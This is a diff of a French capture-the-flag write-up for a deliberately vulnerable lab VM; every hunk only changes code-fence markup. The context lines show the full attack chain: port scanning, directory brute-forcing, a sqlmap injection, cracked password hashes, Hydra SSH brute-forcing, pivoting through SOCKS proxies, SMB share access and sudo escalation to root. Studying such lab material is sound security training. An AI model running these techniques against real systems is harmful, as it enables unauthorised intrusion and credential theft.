@@ -50,7 +50,7 @@ Our house, in the middle of our street
 HTTP ? Oui.  
 
 {% raw %}
-```plain
+```
 $ sudo nmap -T5 -p- -sCV 192.168.1.50
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-29 12:07 CET
 Nmap scan report for 192.168.1.50
@@ -154,7 +154,7 @@ Mais soyons bien organisés et agissons dans l'ordre avec le port 25. La page in
 
 Le serveur ne répond pas via un code 404 pour les pages manquantes mais via un code HTTP 200 sans contenu. Heureusement *feroxbuster* a une option pour exclure selon la taille de la réponse.  
 
-```plain
+```
 $ feroxbuster -u http://192.168.1.50:25/ -w DirBuster-0.12/directory-list-2.3-big.txt -S 0 -n
 
  ___  ___  __   __     __      __         __   ___
@@ -218,7 +218,7 @@ On retrouve donc le flag vu précédemment avec Nmap. La bannière du serveur a 
 
 Ce port est en réalité celui sur lequel j'ai récupéré mes derniers flags car il m'a fallut utiliser des wordlists moins fréquentes pour retrouver les fichiers cachés.  
 
-```plain
+```
 $ feroxbuster -u http://192.168.1.50:8111/ -w wordlists/files/Directories_All.wordlist -x php
 
  ___  ___  __   __     __      __         __   ___
@@ -297,7 +297,7 @@ Concernant la base de données tournant en tant que *root* cette histoire de poi
 Enfin dans le sous-dossier backup se trouve un flag (*{{tryharder:107}}*) ainsi qu'une archive *all.zip* dont le contenu semble raccord à l'application web.
 {% endraw %}
 
-```plain
+```
 Archive:  all.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
@@ -343,7 +343,7 @@ $db = mysqli_connect("172.31.20.10", "root", "anchordb", "timeclock");
 
 Il n'y a pas de manquement à l'authentification (on est correctement redirigés vers la page de login si non connecté) mais la page de login fait partie des scripts faillibles.  
 
-```plain
+```
 $ python sqlmap.py -u "http://192.168.1.50:8115/timeclock/index.php"  --data "username=admin&password=ee&submit=Log+In" --dbms mysql --level 5 --risk 3
 
 sqlmap identified the following injection point(s) with a total of 813 HTTP(s) requests:
@@ -366,7 +366,7 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 Je paste ici les dumps les plus intéressants :  
 
 {% raw %}
-```plain
+```
 available databases [6]:
 [*] anchor
 [*] flag
@@ -413,7 +413,7 @@ Table: anchor_users
 
 Un flag de plus ! Pour le reste les hashs se cassent rapidement :  
 
-```plain
+```
 $2y$12$MaNoQI.ro2vd3Eplh0m.u.Fs/POoCoADcRFCExYhFvX9nSPk6F7Vi:password
 $2y$12$RXw2Ye66qe5FtirI/95mFeQMQt2L7jezw9evcA8DEg0QOp3YZE2xq:heather
 $2y$12$XyIp48YfHyfF8m6UfeN2nO3kLk.PgnL6Lz/pQolT4rDzsyYHGsSdC:anchor
@@ -493,7 +493,7 @@ return [
 
 Le container sur lequel on a atteri a deux interfaces :  
 
-```plain
+```
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.31.10.17  netmask 255.255.255.0  broadcast 172.31.10.255
         ether 02:42:ac:1f:0a:11  txqueuelen 0  (Ethernet)
@@ -514,7 +514,7 @@ eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 J'uploade un Nmap compilé statiquement sur le serveur (*sftp -P 8888 127.0.0.1* grace au tunnel)  
  et je scanne les deux réseaux à la recherche d'hôtes valides.  
 
-```plain
+```
 ./nmap -T5 -sP 172.31.10.27/24
 
 Starting Nmap 7.11 ( https://nmap.org )
@@ -550,7 +550,7 @@ Nmap done: 256 IP addresses (5 hosts up) scanned in 1.74 seconds
 
 J'enchaine sur un scan des ports des IPs qui ont répondu. Voici pour le premier réseau :  
 
-```plain
+```
 map scan report for 172.31.10.1
 Host is up (0.00053s latency).
 Not shown: 65526 closed ports
@@ -586,7 +586,7 @@ All 65535 scanned ports on africa.net10 (172.31.10.194) are closed
 
 Et sur le second réseau :  
 
-```plain
+```
 Nmap scan report for 172.31.20.1
 Host is up (0.00053s latency).
 Not shown: 65526 closed ports
@@ -628,7 +628,7 @@ Ici j'utilise le tunnel SSH existant avec la première machine pour forwarder en
 
 J'ai rajouté les identifiants de base de données et autres dumps SQL à ma liste d'utilisateurs et passwords potentiels. Je passe le tout à Hydra :  
 
-```plain
+```
  $ ./hydra -e nsr -L /tmp/users.txt -P /tmp/pass.txt ssh://127.0.0.1:2424/
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -645,7 +645,7 @@ Pwned ! Dans */root* on trouve le flag *{{tryharder:391}}* et un autre dans la c
 {% endraw %}
 
 {% raw %}
-```plain
+```
 root@cfbd57786836:~# cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -668,7 +668,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 Cette machine a accès à un réseau supplémentaire :  
 
-```plain
+```
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.31.10.194  netmask 255.255.255.0  broadcast 172.31.10.255
         ether 02:42:ac:1f:0a:c2  txqueuelen 0  (Ethernet)
@@ -701,7 +701,7 @@ The kids are playing up downstairs
 
 Ce qui ressort du scan de ce nouveau réseau c'est surtout un serveur SMB :  
 
-```plain
+```
 Nmap scan report for two.net200 (172.31.200.204)
 Host is up (0.000063s latency).
 
@@ -730,13 +730,13 @@ Host script results:
 
 C'est là où ça devient un poil plus tricky. Grâce à notre accès SSH sur la seconde machine (forwardé sur le port 2424 local) on va créer un serveur proxy SOCKS via SSH qui permettra d'atteindre les machines de ce réseau (et surtout le serveur Samba).  
 
-```plain
+```
 $ ssh -D 1080 -N -p 2424 root@127.0.0.1
 ```
 
 Il faut après éditer le fichier de configuration de proxychains pour y mettre la ligne suivante :  
 
-```plain
+```
 socks5 127.0.0.1 1080
 ```
 
@@ -744,7 +744,7 @@ socks5 127.0.0.1 1080
 
 Avec smbclient je peux établir une connexion invité et lister les partages :  
 
-```plain
+```
 $ ./proxychains4 -f proxychains.conf smbclient -U "" -N -L //172.31.200.204
 [proxychains] config file found: proxychains.conf
 [proxychains] preloading ./libproxychains4.so
@@ -772,7 +772,7 @@ Malheureusement l'accès aux partages est protégé. J'ai tenté de bruteforcer 
 
 Et en testant à la mano avec smbclient :  
 
-```plain
+```
 $ ./proxychains4 -f proxychains.conf smbclient -U "larryjr" //172.31.200.204/users
 [proxychains] config file found: proxychains.conf
 [proxychains] preloading ./libproxychains4.so
@@ -799,7 +799,7 @@ Le flag obtenu est *{{tryharder:1337}}*
 
 Sur le partage *companyInfo* on a trois fichiers :  
 
-```plain
+```
   Flag.txt                            A       18  Sun Oct 28 21:55:05 2018
   moreinfo.7z                         A      226  Sun Oct 28 22:02:24 2018
   hint.txt                            A       93  Sun Oct 28 22:03:08 2018
@@ -818,7 +818,7 @@ Un flag (*{{tryharder:2020}}*) et une notice explicative :
 Comme on s'en doutait l'archive 7z restante est protégée par mot de passe. J'utilise l'utilitaire 7z2john puis je casse en générant les mots de passe possibles à la volée :  
 
 {% raw %}
-```plain
+```
 $ python3 -c 'for i in range(100): print("{{tryharder:" + str(i) + "}}")' | ./john --stdin /tmp/hash.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
@@ -840,7 +840,7 @@ We would have such a very good time
 
 Pour terminer intéressons nous au port SSH accessible uniquement depuis l'intéreur du réseau.  
 
-```plain
+```
 $ ./proxychains4 -q -f proxychains.conf hydra -e nsr -L /tmp/users.txt -P /tmp/pass.txt ssh://172.31.200.1/
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -854,7 +854,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra)
 
 Et à partir de là :  
 
-```plain
+```
 $ sudo -l
 sudo: unable to resolve host myhouse7
 [sudo] password for admin: 
@@ -872,13 +872,13 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Oups il manque un flag que j'ai du rater sur l'énumération web. Pas de panique, je met un Ngrep en écoute pour matcher *tryharder* puis je scanne le CMS avec Wapiti :  
 
-```plain
+```
 wapiti -u http://192.168.1.50:8115/ -v2 --color -m ''
 ```
 
 Ngrep le voit transiter dans le pages crawlées :  
 
-```plain
+```
 $ sudo ngrep -q -d enp3s0 tryharder "host 192.168.1.50"
 interface: enp3s0 (192.168.1.0/255.255.255.0)
 filter: ( host 192.168.1.50 ) and ((ip || ip6) || (vlan && (ip || ip6)))
